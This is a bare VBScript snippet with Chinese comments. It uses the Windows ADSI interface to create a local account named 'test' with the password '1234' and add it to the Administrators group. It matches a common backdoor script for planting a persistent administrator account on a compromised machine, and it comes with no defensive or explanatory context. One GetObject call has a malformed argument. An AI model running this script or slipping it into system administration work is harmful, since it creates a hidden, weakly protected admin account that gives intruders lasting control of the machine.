set wsnetwork=CreateObject("WSCRIPT.NETWORK")
os="WinNT://"&wsnetwork.ComputerName
Set ob=GetObject(os) '得到adsi接口,绑定
Set oe=GetObject(os&"/Administrators,group") '属性,admin组
Set od=ob.Create("user","test") '建立用户
od.SetPassword "1234" '设置密码
od.SetInfo '保存
Set of=GetObject(os&"/test",user) '得到用户
oe.add os&"/test" 



